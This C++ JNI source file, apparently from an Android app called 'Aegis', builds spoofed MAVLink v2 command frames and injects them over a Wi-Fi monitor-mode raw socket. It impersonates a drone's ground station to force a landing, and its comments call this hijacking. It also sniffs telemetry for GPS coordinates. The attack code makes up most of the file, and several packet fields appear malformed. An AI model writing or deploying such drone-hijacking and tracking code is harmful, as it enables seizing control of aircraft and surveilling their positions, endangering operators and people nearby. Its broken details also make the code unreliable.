#include <jni.h>
#include <vector>
#include <cstdint>
#include <cmath>
#include <cstring>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>

// ============================================================
// تعريفات بروتوكول MAVLink v2 التكتيكية
// ============================================================
#define MAVLINK_MSG_ID_COMMAND_LONG  76
#define MAVLINK_MSG_ID_GLOBAL_POS    33
#define MAV_CMD_NAV_LAND            21
#define MAV_COMP_ID_GCS             255

// ============================================================
// جداول CRC16 - MCRF4XX (تستخدم للتحقق والحقن)
// ============================================================
static const uint16_t crc16_table[256] = {
    0x0000, 0x1021, 0x2042, 0x3063, 0x4084, 0x50A5, 0x60C6, 0x70E7,
    0x8108, 0x9129, 0xA14A, 0xB16B, 0xC18C, 0xD1AD, 0xE1CE, 0xF1EF,
    0x1231, 0x0210, 0x3273, 0x2252, 0x52B5, 0x4294, 0x72F7, 0x62D6,
    0x9339, 0x8318, 0xB37B, 0xA35A, 0xD3BD, 0xC39C, 0xF3FF, 0xE3DE,
    0x2462, 0x3443, 0x0420, 0x1401, 0x64E6, 0x74C7, 0x44A4, 0x5485,
    0xA56A, 0xB54B, 0x8528, 0x9509, 0xE5EE, 0xF5CF, 0xC5AC, 0xD58D,
    0x3653, 0x2672, 0x1611, 0x0630, 0x76D7, 0x66F6, 0x5695, 0x46B4,
    0xB75B, 0xA77A, 0x9719, 0x8738, 0xF7DF, 0xE7FE, 0xD79D, 0xC7BC,
    0x48C4, 0x58E5, 0x6886, 0x78A7, 0x0840, 0x1861, 0x2802, 0x3823,
    0xC9CC, 0xD9ED, 0xE98E, 0xF9AF, 0x8948, 0x9969, 0xA90A, 0xB92B,
    0x5AF5, 0x4AD4, 0x7AB7, 0x6A96, 0x1A71, 0x0A50, 0x3A33, 0x2A12,
    0xDBFD, 0xCBDC, 0xFBBF, 0xEB9E, 0x9B79, 0x8B58, 0xBB3B, 0xAB1A,
    0x6CA6, 0x7C87, 0x4CE4, 0x5CC5, 0x2C22, 0x3C03, 0x0C60, 0x1C41,
    0xEDAE, 0xFD8F, 0xCDEC, 0xDDCD, 0xAD2A, 0xBD0B, 0x8D68, 0x9D49,
    0x7E97, 0x6EB6, 0x5ED5, 0x4EF4, 0x3E13, 0x2E32, 0x1E51, 0x0E70,
    0xFF9F, 0xEFBE, 0xDFDD, 0xCFFC, 0xBF1B, 0xAF3A, 0x9F59, 0x8F78,
    0x9188, 0x81A9, 0xB1CA, 0xA1EB, 0xD10C, 0xC12D, 0xF14E, 0xE16F,
    0x1080, 0x00A1, 0x30C2, 0x20E3, 0x5004, 0x4025, 0x7046, 0x6067,
    0x83B9, 0x9398, 0xA3FB, 0xB3DA, 0xC33D, 0xD31C, 0xE37F, 0xF35E,
    0x02B1, 0x1290, 0x22F3, 0x32D2, 0x4235, 0x5214, 0x6277, 0x7256,
    0xB5EA, 0xA5CB, 0x95A8, 0x8589, 0xF56E, 0xE54F, 0xD52C, 0xC50D,
    0x34E2, 0x24C3, 0x14A0, 0x0481, 0x7466, 0x6447, 0x5424, 0x4405,
    0xA7DB, 0xB7FA, 0x8799, 0x97B8, 0xE75F, 0xF77E, 0xC71D, 0xD73C,
    0x26D3, 0x36F2, 0x0691, 0x16B0, 0x6657, 0x7676, 0x4615, 0x5634,
    0xD94C, 0xC96D, 0xF90E, 0xE92F, 0x99C8, 0x89E9, 0xB98A, 0xA9AB,
    0x5844, 0x4865, 0x7806, 0x6827, 0x18C0, 0x08E1, 0x3882, 0x28A3,
    0xCB7D, 0xDB5C, 0xEB3F, 0xFB1E, 0x8BF9, 0x9BD8, 0xABBB, 0xBB9A,
    0x4A75, 0x5A54, 0x6A37, 0x7A16, 0x0AF1, 0x1AD0, 0x2AB3, 0x3A92,
    0xFD2E, 0xED0F, 0xDD6C, 0xCD4D, 0xBDAA, 0xAD8B, 0x9DE8, 0x8DC9,
    0x7C26, 0x6C07, 0x5C64, 0x4C45, 0x3CA2, 0x2C83, 0x1CE0, 0x0CC1,
    0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9, 0x9FF8,
    0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0
};

static uint16_t crc_accumulate(uint8_t data, uint16_t crc_accum) {
    uint8_t tmp = (uint8_t)(data ^ (uint8_t)(crc_accum & 0xFF));
    return (uint16_t)((crc_accum >> 8) ^ crc16_table[tmp]);
}

static uint16_t crc_calculate(const uint8_t* buffer, uint16_t length) {
    uint16_t crc = 0xFFFF;
    for (uint16_t i = 0; i < length; i++) {
        crc = crc_accumulate(buffer[i], crc);
    }
    return crc;
}

// ============================================================
// طبقة الحقن الهجومية (RF Injection Mode)
// ============================================================
static void inject_rf_frame(const uint8_t* mav_data, size_t len) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) return;

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = if_nametoindex("wlan0mon"); // يتطلب Monitor Mode

    // ترويسة Radiotap لتمكين الحقن اللاسلكي
    uint8_t rtap[] = { 0x00, 0x00, 0x0d, 0x00, 0x04, 0x80, 0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00 };
    
    uint8_t full_frame[512];
    memcpy(full_frame, rtap, sizeof(rtap));
    memcpy(full_frame + sizeof(rtap), mav_data, len);

    sendto(sock, full_frame, sizeof(rtap) + len, 0, (struct sockaddr*)&sa, sizeof(sa));
    close(sock);
}

// ============================================================
// استدعاء JNI: حلقة التحكم والقفز الترددي
// ============================================================
extern "C" JNIEXPORT jfloat JNICALL
Java_com_jamesfirstok_aegis_core_AegisSystemOrchestrator_activateControlLoop(
        JNIEnv* env, jobject thiz) {
    static float last_err = 0.0f;
    static float integral = 0.0f;
    float setpoint = 2412.0f;
    float current = 2415.0f; 

    float error = setpoint - current;
    integral += error;
    float output = (0.5f * error) + (0.1f * integral);
    last_err = error;

    return output;
}

// ============================================================
// استدعاء JNI: اختراق MAVLink وفرض الهبوط (Hijacking)
// ============================================================
extern "C" JNIEXPORT jboolean JNICALL
Java_com_jamesfirstok_aegis_core_AegisSystemOrchestrator_mavlinkOverride(
        JNIEnv* env, jobject thiz, jint last_observed_seq) {
    
    uint8_t packet[128];
    uint16_t i = 0;

    // ترويسة MAVLink v2 الهجومية
    packet[i++] = 0xFD;             // Start Sign
    packet[i++] = 33;               // Payload Length (COMMAND_LONG size)
    packet[i++] = 0x00;             // Flags
    packet[i++] = 0x00;             // Flags
    packet[i++] = (uint8_t)((last_observed_seq + 5) % 256); // Sequence Hijacking
    packet[i++] = 255;              // System ID (Inpersonating GCS)
    packet[i++] = 190;              // Component ID

    // Message ID: COMMAND_LONG (76)
    packet[i++] = 0x4C; packet[i++] = 0x00; packet[i++] = 0x00;

    // Payload: MAV_CMD_NAV_LAND (21)
    float p1 = (float)MAV_CMD_NAV_LAND;
    memcpy(&packet[i], &p1, 4); i += 4;
    
    float zero = 0.0f;
    for(int x=0; x<6; x++) { memcpy(&packet[i], &zero, 4); i+=4; } // Other params

    packet[i++] = 1; // Target System
    packet[i++] = 1; // Target Component
    packet[i++] = 0; // Confirmation

    // حساب CRC-Extra لرسالة COMMAND_LONG (القيمة 152)
    uint16_t crc = crc_calculate(&packet[1], i - 1);
    crc = crc_accumulate(152, crc); 

    packet[i++] = (uint8_t)(crc & 0xFF);
    packet[i++] = (uint8_t)((crc >> 8) & 0xFF);

    // الحقن الفعلي في طبقة الـ PHY
    inject_rf_frame(packet, i);

    return JNI_TRUE;
}

// ============================================================
// استدعاء JNI: التقاط التليميتري وفك تشفير الإحداثيات (Sniffing)
// ============================================================
extern "C" JNIEXPORT jdoubleArray JNICALL
Java_com_jamesfirstok_aegis_core_AegisSystemOrchestrator_captureTelemetry(
        JNIEnv* env, jobject thiz, jbyteArray raw_data) {
    
    jbyte* buffer = env->GetByteArrayElements(raw_data, NULL);
    jsize len = env->GetArrayLength(raw_data);

    // البحث عن رسالة GLOBAL_POSITION_INT (ID: 33)
    for (int i = 0; i < len - 20; i++) {
        if ((uint8_t)buffer[i] == 0xFD) {
            uint32_t msg_id = (buffer[i+9] << 16) | (buffer[i+8] << 8) | buffer[i+7];
            if (msg_id == MAVLINK_MSG_ID_GLOBAL_POS) {
                int32_t lat, lon;
                memcpy(&lat, &buffer[i+14], 4); // استخراج Lat
                memcpy(&lon, &buffer[i+18], 4); // استخراج Lon
                
                jdoubleArray coords = env->NewDoubleArray(2);
                double c[2] = {lat / 1e7, lon / 1e7};
                env->SetDoubleArrayRegion(coords, 0, 2, c);
                
                env->ReleaseByteArrayElements(raw_data, buffer, JNI_ABORT);
                return coords;
            }
        }
    }

    env->ReleaseByteArrayElements(raw_data, buffer, JNI_ABORT);
    return nullptr;
}
